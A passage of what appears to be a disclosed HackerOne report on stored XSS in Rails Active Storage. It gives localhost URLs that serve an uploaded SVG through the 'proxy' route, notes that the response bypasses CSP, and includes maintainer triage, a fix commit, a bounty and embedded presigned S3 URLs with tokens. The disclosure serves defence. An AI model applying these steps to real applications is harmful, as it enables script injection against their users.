URL.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://localhost:3000/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"3-xss\"\u003e3. XSS\u003c/h4\u003e\n\n\u003cp\u003eRewrite \u003ccode\u003eredirect\u003c/code\u003e in URL to \u003ccode\u003eproxy\u003c/code\u003e and alert will appear when opening URL directly in browser.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://localhost:3000/rails/active_storage/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ed4ee8109834f4dd747bfb68d7a7ddc2e43e8f69/alert.svg\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"__________2020-08-02_13.56.07.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y8cVzeAnppMhG3nekekqk4WM?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-02_13.56.07.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-02_13.56.07.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUV6IDV73%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071338Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCXBpBw2P6c96TpPhGunUVoS2EZwPAR0UjOwaNFkDRyUAIgB9DvSM0bpmOT%2FEVdBvHK8iyZgC%2B6mu%2Fxidk8HIEIj0EqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDAuF942NBlJsMTeygiqRA4ABbIq210R5PDf5cm0Q7y%2FFgDztDLV5UzEfzjqpxU8DNXJbPCNopAJeZ8MtHWN%2FZo1lZMnbwlNUl5H9FWLwQd%2FBJ5KiwJOgUMYu7Kk6mWXvV0E5Eqe4R%2FUkAs4WbvrfZM4fq%2FcVTRJgvsOGs5QT8F2N0Sw4MGFbIqFzdInIrucBIcAjjocbp7%2FmMQkl1rCQU8VRqwty309v%2BvQyCXntaBXMnP3h8b2rdGxftWBBOxLTF4NLs%2BOrx3PvIMSR7zpn1PtxcWnCd78ZLY7CS8sz0uMfVuQq%2B%2BWsAHGRRf9GbNJ6aUIsqUWp8p16B%2BJtBD%2FcA25X1IV0Ox5GkYGqecyHk7tIQ7WnJGRCXnsxZcBMwcK7y3HHAFw2T6Iop%2F%2F0kasTRDxEimFiICdzwa8NhkMwoFoFFnYHjYJ%2F4suk27ebqgsVJeq0323Tk4zZVpuGZ7GICfOBss5lvu52vjAcWtCgXl5UkIZtbiqJ5ccBOKz4HA5w%2BvEnEqIydUUpt5IZU4ipKrlfIUy2EBqhtMThWfq%2B%2BBhHMOibq%2F8FOusB64nWJNDDVtspdftl7aqpY%2B8gpHN9Q9dqgpHIwoa0X7rVDmVAWWvT3PE%2FnLv3hgCU1xHdjm9DWxGwfhS1Y5ZTjPHcUKBDh1%2B%2FZW4equEm0wwoan0z7Ppf3nLHlf4YKx2uQzLfQPavZIsawk4YBJxt53W09F4X%2Fi36%2FtexyB8CbbPMFHRrT1iHVdL%2F1Zod%2FAGQIumXSCau15L%2FujfNpINtSSB5Y%2B4JZOEIxuDKJXEYttpTn1nadZrYBadyOkI%2BZOkvY4BLYv1udAwzqOydnc0XaBLIadIaXjPgOKzmslBJY2jJAVGtldIkOds%2FDA%3D%3D\u0026amp;X-Amz-Signature=15d74b6cd33ebfed13f30202870f998b64f26ae0b8818aecca27e944c7fcc382\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y8cVzeAnppMhG3nekekqk4WM?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-02_13.56.07.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-02_13.56.07.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUV6IDV73%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071338Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCXBpBw2P6c96TpPhGunUVoS2EZwPAR0UjOwaNFkDRyUAIgB9DvSM0bpmOT%2FEVdBvHK8iyZgC%2B6mu%2Fxidk8HIEIj0EqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDAuF942NBlJsMTeygiqRA4ABbIq210R5PDf5cm0Q7y%2FFgDztDLV5UzEfzjqpxU8DNXJbPCNopAJeZ8MtHWN%2FZo1lZMnbwlNUl5H9FWLwQd%2FBJ5KiwJOgUMYu7Kk6mWXvV0E5Eqe4R%2FUkAs4WbvrfZM4fq%2FcVTRJgvsOGs5QT8F2N0Sw4MGFbIqFzdInIrucBIcAjjocbp7%2FmMQkl1rCQU8VRqwty309v%2BvQyCXntaBXMnP3h8b2rdGxftWBBOxLTF4NLs%2BOrx3PvIMSR7zpn1PtxcWnCd78ZLY7CS8sz0uMfVuQq%2B%2BWsAHGRRf9GbNJ6aUIsqUWp8p16B%2BJtBD%2FcA25X1IV0Ox5GkYGqecyHk7tIQ7WnJGRCXnsxZcBMwcK7y3HHAFw2T6Iop%2F%2F0kasTRDxEimFiICdzwa8NhkMwoFoFFnYHjYJ%2F4suk27ebqgsVJeq0323Tk4zZVpuGZ7GICfOBss5lvu52vjAcWtCgXl5UkIZtbiqJ5ccBOKz4HA5w%2BvEnEqIydUUpt5IZU4ipKrlfIUy2EBqhtMThWfq%2B%2BBhHMOibq%2F8FOusB64nWJNDDVtspdftl7aqpY%2B8gpHN9Q9dqgpHIwoa0X7rVDmVAWWvT3PE%2FnLv3hgCU1xHdjm9DWxGwfhS1Y5ZTjPHcUKBDh1%2B%2FZW4equEm0wwoan0z7Ppf3nLHlf4YKx2uQzLfQPavZIsawk4YBJxt53W09F4X%2Fi36%2FtexyB8CbbPMFHRrT1iHVdL%2F1Zod%2FAGQIumXSCau15L%2FujfNpINtSSB5Y%2B4JZOEIxuDKJXEYttpTn1nadZrYBadyOkI%2BZOkvY4BLYv1udAwzqOydnc0XaBLIadIaXjPgOKzmslBJY2jJAVGtldIkOds%2FDA%3D%3D\u0026amp;X-Amz-Signature=15d74b6cd33ebfed13f30202870f998b64f26ae0b8818aecca27e944c7fcc382\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eXSS is possible if attacker can upload files using Active storage.\u003cbr\u003e\nThis commit has not been released yet, so it only affects services using Rails on the master branch.\u003cbr\u003e\n(Maybe \u003ccode\u003eHey\u003c/code\u003e etc. \u003ca title=\"https://gist.github.com/dhh/782fb925b57450da28c1e15656779556#file-gemfile-L3\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fdhh%2F782fb925b57450da28c1e15656779556%23file-gemfile-L3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/dhh/782fb925b57450da28c1e15656779556#file-gemfile-L3\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eIn addition, since the csp header is not output for the svg file (\u003ca title=\"https://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/http/content_security_policy.rb#L20\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fblob%2Fmaster%2Factionpack%2Flib%2Faction_dispatch%2Fhttp%2Fcontent_security_policy.rb%23L20\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails/blob/master/actionpack/lib/action_dispatch/http/content_security_policy.rb#L20\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), it can be avoided even if csp is set.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":933309,"file_name":"__________2020-08-02_13.56.07.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/y8cVzeAnppMhG3nekekqk4WM?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-02_13.56.07.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-02_13.56.07.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUV6IDV73%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCXBpBw2P6c96TpPhGunUVoS2EZwPAR0UjOwaNFkDRyUAIgB9DvSM0bpmOT%2FEVdBvHK8iyZgC%2B6mu%2Fxidk8HIEIj0EqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDAuF942NBlJsMTeygiqRA4ABbIq210R5PDf5cm0Q7y%2FFgDztDLV5UzEfzjqpxU8DNXJbPCNopAJeZ8MtHWN%2FZo1lZMnbwlNUl5H9FWLwQd%2FBJ5KiwJOgUMYu7Kk6mWXvV0E5Eqe4R%2FUkAs4WbvrfZM4fq%2FcVTRJgvsOGs5QT8F2N0Sw4MGFbIqFzdInIrucBIcAjjocbp7%2FmMQkl1rCQU8VRqwty309v%2BvQyCXntaBXMnP3h8b2rdGxftWBBOxLTF4NLs%2BOrx3PvIMSR7zpn1PtxcWnCd78ZLY7CS8sz0uMfVuQq%2B%2BWsAHGRRf9GbNJ6aUIsqUWp8p16B%2BJtBD%2FcA25X1IV0Ox5GkYGqecyHk7tIQ7WnJGRCXnsxZcBMwcK7y3HHAFw2T6Iop%2F%2F0kasTRDxEimFiICdzwa8NhkMwoFoFFnYHjYJ%2F4suk27ebqgsVJeq0323Tk4zZVpuGZ7GICfOBss5lvu52vjAcWtCgXl5UkIZtbiqJ5ccBOKz4HA5w%2BvEnEqIydUUpt5IZU4ipKrlfIUy2EBqhtMThWfq%2B%2BBhHMOibq%2F8FOusB64nWJNDDVtspdftl7aqpY%2B8gpHN9Q9dqgpHIwoa0X7rVDmVAWWvT3PE%2FnLv3hgCU1xHdjm9DWxGwfhS1Y5ZTjPHcUKBDh1%2B%2FZW4equEm0wwoan0z7Ppf3nLHlf4YKx2uQzLfQPavZIsawk4YBJxt53W09F4X%2Fi36%2FtexyB8CbbPMFHRrT1iHVdL%2F1Zod%2FAGQIumXSCau15L%2FujfNpINtSSB5Y%2B4JZOEIxuDKJXEYttpTn1nadZrYBadyOkI%2BZOkvY4BLYv1udAwzqOydnc0XaBLIadIaXjPgOKzmslBJY2jJAVGtldIkOds%2FDA%3D%3D\u0026X-Amz-Signature=15d74b6cd33ebfed13f30202870f998b64f26ae0b8818aecca27e944c7fcc382","file_size":579944,"type":"image/png"}],"allow_singular_disclosure_at":"2020-10-01T19:14:06.906Z","allow_singular_disclosure_after":-7646371.52393653,"singular_disclosure_allowed":true,"vote_count":3,"voters":["mygf","prinzhorn","tvmarques"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":160,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rails/rails","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8847959,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ooooooo_q,\n\nThanks for the report! We're still looking into this one and will let you know as soon as we have an update.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ooooooo_q\"\u003e@ooooooo_q\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for the report! We\u0026#39;re still looking into this one and will let you know as soon as we have an update.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-04T19:27:14.390Z","updated_at":"2020-08-04T19:27:14.390Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9061080,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-27T22:03:00.585Z","updated_at":"2020-08-27T22:03:00.585Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9089447,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ooooooo_q,\n\nSorry for the delay. I think [b221a4d](https://github.com/rails/rails/commit/b221a4dc43368a1b6f00476f7c5f6047c5c7eea4) in master addresses this. Mind confirming?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ooooooo_q\"\u003e@ooooooo_q\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry for the delay. I think \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fcommit%2Fb221a4dc43368a1b6f00476f7c5f6047c5c7eea4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eb221a4d\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in master addresses this. Mind confirming?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-31T15:33:06.397Z","updated_at":"2020-08-31T15:33:06.397Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9092327,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @georgeclaghorn,\n\nI confirmed that commit. it seems there is no problem.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/georgeclaghorn\"\u003e@georgeclaghorn\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI confirmed that commit. it seems there is no problem.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-31T20:02:20.067Z","updated_at":"2020-08-31T20:02:20.067Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9092365,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you!","markdown_message":"\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-31T20:11:02.634Z","updated_at":"2020-08-31T20:11:02.634Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9103437,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-01T19:13:20.823Z","updated_at":"2020-09-01T19:13:20.823Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby on Rails"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rails","collaborator":{"username":"ooooooo_q","url":"/ooooooo_q"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9103447,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-01T19:14:06.826Z","updated_at":"2020-09-01T19:14:06.826Z","first_to_agree":true,"actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9104549,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-01T22:51:37.209Z","updated_at":"2020-09-01T22:51:37.209Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9104550,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-01T22:51:37.261Z","updated_at":"2020-09-01T22:51:37.261Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}